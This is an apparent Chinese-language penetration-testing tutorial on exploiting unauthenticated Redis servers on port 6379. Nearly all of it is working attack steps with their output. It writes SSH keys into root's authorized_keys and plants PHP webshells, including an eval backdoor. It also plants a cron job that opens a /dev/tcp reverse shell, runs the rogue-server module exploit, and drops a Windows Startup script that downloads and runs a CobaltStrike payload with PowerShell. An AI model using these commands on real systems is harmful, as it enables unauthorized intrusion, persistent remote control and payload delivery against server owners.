# Redis 6379端口

## 关于

<a-checkbox checked>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上</a-checkbox></br>

<a-checkbox checked>如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</a-checkbox></br>

<a-checkbox checked>攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</a-checkbox></br>



## 攻击方法

要成功的利用Redis未授权访问的漏洞需要如下几点

<a-checkbox checked>redis服务以root账户运行</a-checkbox></br>

<a-checkbox checked>redis无密码或弱密码进行认证</a-checkbox></br>

<a-checkbox checked>redis监听在0.0.0.0公网上或内网中</a-checkbox></br>



首先可以使用 Nmap的检测脚本 对 Redis进行未授权检测

```php
nmap -A -p 6379 –script redis-info 192.168.0.126
```

也可以使用其他工具进行扫描

![img](../../../.vuepress/public/img/1628511265889-a89c273a-fa98-458c-b7d0-8a61b9098cc2-20220415143203556.png)



连接数据库查看 info, 确定未授权访问

```php
redis-cli -h 192.168.0.126 -p 6379
```

![img](../../../.vuepress/public/img/1628511872365-61010be1-642a-4a70-8390-1de94a771e5b-20220415143203424.png)

![img](../../../.vuepress/public/img/1628511715038-57addcaa-bed5-4db8-a030-acafc228ba79-20220415143203457.png)

## Linux 获取权限

### SSH公钥

生成密钥在攻击机中

```php
ssh-keygen -t rsa
```

![img](../../../.vuepress/public/img/1628512967608-9d62672c-9db3-4b07-94ad-70d03edf02b7-20220415143203434.png)

将公钥导入key.txt文件（前后用\n\n换行，避免和Redis里其他缓存数据混合）

```php
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

![img](../../../.vuepress/public/img/1628513275098-e5bcd6c4-3c19-4aaa-b2c1-90bd3d3b4a4e-20220415143203451.png)

再把 key.txt 文件内容写入目标主机的缓冲里

```php
cat key.txt | redis-cli -h 192.168.0.126 -x set test 
```

![img](../../../.vuepress/public/img/1628514409894-848f4f59-3b45-449a-8566-c204aed32354-20220415143203297.png)
再通过设置参数，写入指定文件

```php
┌──(root💀kali)-[~/.ssh]
└─# redis-cli -h 192.168.0.126 -p 6379
192.168.0.126:6379> config set dir /root/.ssh
OK
192.168.0.126:6379> config set dbfilename authorized_keys
OK
192.168.0.126:6379> keys *
1) "test"
192.168.0.126:6379> get test
"\n\n\nssh-rsa xxxxxxxxxxxx \n\n\n\n"
192.168.0.126:6379> save
OK
192.168.0.126:6379> 
```

![img](../../../.vuepress/public/img/1628515307073-5d1f3553-587e-476a-9556-beb3c9eb54bf-20220415143203556.png)

- ✅如上则为成功写入SSH密钥文件，攻击机可无需密码远程连接目标主机SSH



### WebShell

当SSH不允许远程登录时，也可以通过写入 Web目录控制目标主机

```php
┌──(root💀kali)-[~/.ssh]
└─# redis-cli -h 192.168.0.126 -p 6379
192.168.0.126:6379> config set dir /var/www/html
OK
192.168.0.126:6379> config set dbfilename xxx.php
OK
192.168.0.126:6379> set web "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
OK
192.168.0.126:6379> save
OK
```

![img](../../../.vuepress/public/img/1628515979062-1d027d69-3100-4eb9-9496-43b0b15a7768-20220415143203717.png)

### 定时任务

也可以通过写入定时任务反弹Shell，获取权限

<a-checkbox checked>攻击机监听端口 </a-checkbox></br>

<a-checkbox checked>nc -lvvp 9999</a-checkbox></br>

```php
192.168.0.126:6379> set test2 "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.140/9999 0>&1\n\n"
OK
192.168.0.126:6379> config set dir /var/spool/cron
OK
192.168.0.126:6379> config set dbfilename root
OK
192.168.0.126:6379> save
OK
192.168.0.126:6379> 
```

![img](../../../.vuepress/public/img/1628603729549-61622428-de4c-4dbf-abdb-7ceb5c0d6240-20220415143203493.png)

### 主从复制

<a-checkbox checked>如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。</a-checkbox></br>

<a-checkbox checked>为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机</a-checkbox></br>

<a-checkbox checked>其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</a-checkbox></br>

Redis未授权访问在4.x/5.0.5以前版本，我们可以使用主/从模式加载远程模块，通过动态链接库的方式执行任意命令。



关于漏洞原理请查看[Pavel Toporkov的分享](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

漏洞利用脚本: [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

```shell
➜ ./redis-rogue-server.py -h
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py [options]

Options:
  -h, --help           show this help message and exit
  --rhost=REMOTE_HOST  target host
  --rport=REMOTE_PORT  target redis port, default 6379
  --lhost=LOCAL_HOST   rogue server ip
  --lport=LOCAL_PORT   rogue server listen port, default 21000
  --exp=EXP_FILE       Redis Module to load, default exp.so
  -v, --verbose        Show full data stream
Example
```



```shell
python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so
```



![img](../../../.vuepress/public/img/1628608226504-a9981cc4-1dae-4c85-9468-39bd3f030305-20220415143203642.png)

![img](../../../.vuepress/public/img/1628608233667-192fed23-55a2-43a8-88df-75cc7d9d0b9b-20220415143203584.png)

## Windows 获取权限

### Webshell

<a-checkbox checked>攻击成功的前提为：需要准确的知道Web目录位置</a-checkbox></br>

<a-checkbox checked>可通过 phpinfo 或者 网站报错得知</a-checkbox></br>

![img](../../../.vuepress/public/img/1628609553023-5e320f71-cea1-4ade-ad72-f1e0f51f7f11-20220415143203567.png)

这里测试的目标路径为：`C:\phpstudy_pro\WWW`

```php
192.168.0.123:6379> config set dir C:\phpstudy_pro\WWW
OK
192.168.0.123:6379> config set dbfilename shell.php
OK
192.168.0.123:6379> set test "<?php @eval($_POST['shell'])?>"
OK
192.168.0.123:6379> save
OK
```

![img](../../../.vuepress/public/img/1628609873998-b83c9a14-4307-45fb-8c50-f46b79d85f86-20220415143203676.png)

<a-checkbox checked>成功写入木马，并可连接控制服务器</a-checkbox></br>

![img](../../../.vuepress/public/img/1628609802263-2105839f-6645-428b-82d4-bbb75b3dadb9-20220415143203681.png)

### 启动项

攻击方法与写入Linux启动项相似

<a-checkbox checked>需要高权限账户</a-checkbox></br>

<a-checkbox checked>Windows 启动项目录为:</a-checkbox></br>

<a-checkbox checked>C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/</a-checkbox></br>

<a-checkbox checked>C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp</a-checkbox></br>



首先创建 CobaltStrike监听

<a-checkbox checked>`Attacks -> Web Drive-By -> Script Web Delivery`</a-checkbox></br>

![img](../../../.vuepress/public/img/1628610432546-2e313488-1ab1-42f2-bf37-fb074693c30a-20220415151326919.png)

生成 Powershell 语句

```php
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.126:6666/a'))"
```

 执行Redis命令写入语句

```php
192.168.0.123:6379> config set dir "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/"
OK
192.168.0.123:6379> config set dbfilename cmd.bat
OK
192.168.0.123:6379> set x "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.0.126:6666/a'))\"\r\n\r\n"
OK
192.168.0.123:6379> save
OK
```

当主机重启时就会执行命令上线 CobaltStrike

![img](../../../.vuepress/public/img/1628682645780-adbda105-6e56-481d-a4c9-b34e6bd5908b-20220415143203710.png)

